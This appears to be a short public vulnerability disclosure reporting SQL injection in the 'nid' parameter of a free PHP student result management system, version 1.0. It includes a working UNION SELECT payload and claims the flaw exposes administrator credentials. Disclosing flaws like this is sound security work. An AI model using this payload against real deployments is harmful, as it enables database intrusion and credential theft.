#### Title: Best Student Result Management System 1.0 SQLi
#### Author: toyydsBT123
#### Date: 15.09.2022
#### Vendor: https://www.sourcecodester.com/users/mayurik
#### Software: https://www.sourcecodester.com/php/15653/best-student-result-management-system-project-source-code-php-and-mysql-free-download
#### Version: 1.0
#### Reference: https://github.com/toyydsBT123/One_of_my_take_on_SourceCodester/blob/main/Best-Student-Result-Management-System_1.0.poc.md

#### Description:
### The joint query injects the selected item into the query, and can obtain system information and administrator account password. The SQL injection vulnerability on this page severely compromises the security, confidentiality of the application by exposing the application to administrator level information compromise.

# Status: CRITICAL

### [+] Payloads:

``` 
GET
?nid=2' union all select null,user(),null,null-- -
```

## Proof and Exploit:
code![image](https://github.com/toyydsBT123/One_of_my_take_on_SourceCodester/blob/main/1.png)
Firefox browser ![image](https://github.com/toyydsBT123/One_of_my_take_on_SourceCodester/blob/main/2.png)
